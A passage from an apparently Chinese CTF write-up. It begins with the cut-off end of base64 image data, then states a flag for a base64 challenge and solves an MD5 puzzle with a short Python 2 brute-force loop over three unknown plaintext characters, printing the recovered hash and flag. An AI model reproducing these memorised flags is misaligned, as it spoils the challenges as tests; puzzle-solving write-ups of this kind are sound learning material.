0Vv+rjJ/4A8BXHTsRTHFdjY7pD2Zh8z4fT7fCPV/CXFj4v4PwqNrv4sRtqRwY27khGx31/GPJRGV+6pfmB36jY6QAMtwVQw2YTaAIDyZq2z6WHpUeRsXHJCn5cz5XKfc68mHPm7VsAgELD+F7lPByklm4I7R3+aLN+AHBYhgabV/pA/xFuh6N0aCtKZdtuaKN+mrTLov+EMX+JTr8iGhcAwLhSVSNjY/2KaxO0xpVttuXf0vd0/XWdPYH42EiUA+jW2oiVUWOlzLwqvMROTy3udYDO9n5Dw3YTwF5RxcAd1Q+nz8bebgKK+cV4I/rlle6zVvV6AWdXy8+6ru21d1n9taK/12Jb7p1QzOvt0cU5/a5SbYwzkD5v4G9VrHuF47cKNhluC1wE0PEfNgA67o+olqvM/UFl/h1amIVp9qfP1v7+w49Ovt/DF+ojPLx1aYaeSe0a215dmD/kFHCVtaqD4/f2eupv/IxZysUurRcqf9Y5eFYM3x7NgCPz05sPHN7q6PeO310z+SueNezmZ9WrH/7+5NthgiCkkPaQIPIN9WGCyDd0Fg9B5BuywwSRb6gPE0S+mXMfPmo9p11j6uxeH8X0xn75ifY7XPWFMYerd646WyJHzLUPH72eU2uI4T0MXJ3q5yKhN4a8/QWjLYQYmIdWTc9RZ0vkirn14Uw9ZxLPtvlPtGf9VB5Eqdxx4onk9tDhKmP1TrMybPyDDCmNSeiNJ2p/pNHDJjqIUDmvRWMn09kSp5abt25K9MPHQ6qeU5Yyru609IgA1ZV/ukVZejThwFSGharJsrzAMOHAVJBs2LDeOKv9knotK8huKmFZ4eeBqSAhq51EZ0ucVnKyplUwqt1t27W6Kgfs7W41OqxVzIFoGwCgNaYZkzu81enUi55BLNY76PRiw1in3z3cFaDY3/DtcKBmgsNb8DceFoyHyRG4tqJ0eoNDVkwsOLk5m7ZU7vYduwfTKre43e+WZ6pnLpTKSYs62+m5XSu2qlE7n9KKWdZJnA6WxOg0x49Ez6mtlnsPtrvVG9pqubXRKg8dhTUJ3b4T1OPWoq2W61kryYfsXk6/q/gDB4ffCQxxwaiiFVTLN5rxbGPrbInTTPX2fObDSVMUm2zKzjdyJ6kDEZ8lJg+O9PMMHygZKS2MjFURb1Jy9hudxKa3P7XeiO1VdF2RRyjxWfT46wXEKYat3fr0ow9+R7ql0Ry97NXh6h08DF6Gkc6WGIel/xA5mRDPnSPTGwcvtYqtavg2m3S2xHiwP372WeXDD8kOE0ROWfrrDzl5vUQQhIylf8vLK2KCIGSQHSaIfLP01x9oTYsgcszSv9NYmiDyzNK/07slgsgzSz9QHyaIPLP0w7xbQBDEYTiZmgeCIMaFFrQIIt/8f22KF2eFPznlAAAAAElFTkSuQmCC)

**题解**

还是运行之前的那个脚本，得到`nctf{random_mixed_base64_encode}`

### MD5

**题干**

```
python大法好！
这里有一段丢失的md5密文
e9032???da???08????911513?0???a2
要求你还原出他并且加上nctf{}提交

已知线索 明文为： TASC?O3RJMV?WDJKX?ZM

题目来源：安恒杯
```

**题解**

写个脚本爆破一下

```Python
import hashlib

s = list('TASC?O3RJMV?WDJKX?ZM')
base = list('QAZWSXEDCRFVTGBYHNUJMIKOLP1234567890qazwsxedcrfvtgbyhnujmikolp')
for i in base:
    s[4] = i
    for j in base:
        s[11] = j
        for k in base:
            s[17] = k
            strtmp = ''.join(s)
            md5 = str(hashlib.md5(strtmp).hexdigest())
            if md5[:5] == 'e9032' and md5[-2:] == 'a2':
                print strtmp
                print md5
```

运行得到

```
TASCJO3RJMVKWDJKXLZM
e9032994dabac08080091151380478a2
```

所以flag是`nctf{e9032994dabac08080091151380478a2}`
